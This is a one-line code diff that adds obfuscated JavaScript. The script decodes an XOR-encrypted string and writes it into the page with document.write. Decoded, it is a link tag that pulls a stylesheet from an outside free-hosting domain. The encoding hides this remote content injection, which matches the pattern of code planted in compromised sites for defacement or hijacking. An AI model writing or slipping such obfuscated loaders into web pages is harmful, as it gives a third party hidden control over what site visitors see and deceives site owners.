@@ -1,0 +1,1 @@
+var enkripsi="'1Ankli'02jpgd'1F'05jvvr'1C--fjmmmgq,hu,nv-gt0,aqq'05'02pgn'1F'05qv{ngqjggv'05'02v{rg'1F'05vgzv-aqq'05-'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
